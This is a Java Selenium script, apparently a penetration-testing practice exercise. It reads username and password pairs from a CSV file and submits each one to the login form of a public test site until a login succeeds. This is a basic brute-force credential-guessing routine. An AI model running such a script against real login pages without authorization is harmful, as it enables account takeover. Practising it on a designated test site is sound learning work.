package com.hasnain.web.sel.pentesting;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.Reader;
import java.nio.charset.StandardCharsets;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;

import com.google.common.io.Files;
import com.opencsv.CSVReader;


public class Submission {
 
	WebDriver driver = null;
 
 
	  public void setup() throws Exception { 
	  // set geckodriver path.
	  System.setProperty("webdriver.chrome.driver", "C:/Users/Hasnain/Downloads/chromedriver_win32/chromedriver.exe");
	  
	  driver = new ChromeDriver();
	  driver.get("http://the-internet.herokuapp.com/login"); 
	  } 
 
	  public void tearDown() throws Exception { 
		  driver.quit();
	  } 

  public void test(String filename) throws IOException{
	  Reader reader = Files.newReader( new File(filename), StandardCharsets.UTF_8);
      CSVReader csvReader = new CSVReader(reader);
      String[] nextRecord;
      
      while ((nextRecord = csvReader.readNext()) != null) {
    	  System.out.println("Try combination: username=" + nextRecord[0] + " and password=" + nextRecord[1]);
    	  
		  driver.findElement(By.name("username")).sendKeys(nextRecord[0]);
		  driver.findElement(By.name("password")).sendKeys(nextRecord[1]);
		  driver.findElement(By.className("radius")).submit();
	   
		  try {
			  driver.findElement(By.className("success"));
		  	}
		  catch(Exception e) {
			  System.out.println("Failed");
			  continue;
		  }
		  
		  System.out.println("Login Successful!!");
		  break;
    }
  }
}